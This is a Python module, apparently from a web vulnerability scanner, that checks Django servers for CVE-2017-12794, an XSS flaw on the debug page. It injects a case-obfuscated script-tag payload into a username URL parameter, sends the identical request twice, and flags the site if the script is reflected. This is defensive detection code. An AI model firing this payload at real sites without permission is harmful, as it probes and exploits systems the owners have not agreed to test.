#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
# from lib.tool import check

cve_2017_12794_payloads = [
    {'path': '{URLCONF}/?username=<ScRiPt>prompt(\'{TEXT}\')</sCrIpt>'},
    # {'path': 'create_user/?username=<ScRiPt>prompt(\'{TEXT}\')</sCrIpt>'},
    # {'path': '?username=<ScRiPt>prompt(\'{TEXT}\')</sCrIpt>'},
]

def cve_2017_12794_scan(self, clients):
    '''Django debug page XSS漏洞
            构造url创建新用户, 同时拼接xss语句, 得到已创建的提示;
            此时再次访问该链接(即创建同一个xss用户), 将触发恶意代码
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'XSS',
        'vul_id': 'CVE-2017-12794',
    }
    
    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
    if not urlConfList:
        return None
    
    for payload in cve_2017_12794_payloads:        # * Payload
        for urlConf in urlConfList:
            random_str = random_md5(5)             # * 随机5位字符串
            
            path = payload['path'].format(URLCONF=urlConf, TEXT=random_str)  # * Path

            res1 = client.request(
                'get',
                path,
                vul_info=vul_info
            )
            if res1 is None:
                continue

            # * 该XSS漏洞的特性, 需要请求2次, 2次的payload必须一模一样
            res2 = client.request(
                'get',
                path,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            text_1 = "<ScRiPt>prompt('" + random_str + "')"
            text_2 = "<ScRiPt>confirm('" + random_str + "')"
            
            if (text_1 in res2.text
                or text_2 in res2.text
            ):
                results = {
                    'Target': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res2
                }
                return results
    return None
